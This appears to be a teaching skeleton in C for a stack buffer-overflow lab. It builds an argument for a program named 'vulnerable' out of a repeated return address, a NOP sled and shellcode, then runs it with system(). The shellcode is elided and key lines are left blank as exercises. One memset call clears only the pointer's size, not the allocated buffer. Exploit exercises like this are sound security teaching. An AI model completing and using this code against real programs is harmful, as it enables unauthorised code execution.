#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]= "\x31 ... \x80";         // initialize shellcode from tiny_shell
int main(int argc, char *argv[]) {
        unsigned int i, ret;
        char *command, *buffer;
        command = (char *) malloc(200);
        memset(command,0,sizeof(command));// zero out the new memory
       
        strcpy(command, "./vulnerable \'"); // start command buffer
        buffer = command + strlen(command); // set buffer at the end
        if(argc > 1)
                   // extract return address from argv[1]
                  ret =;
        //else
                  // apply default value
        // fill buffer with 32-bit return address ret of type unsigned int
        for(i= ; i <100 ; i+=4){
        *((/* apply casting */)(buffer+i)) = ret;
        // build NOP sled at the beginning of the buffer
        
        // copy shellcode into buffer
        }
        strcat(command, "\'");
        system(command); // run exploit
        free(command);
}

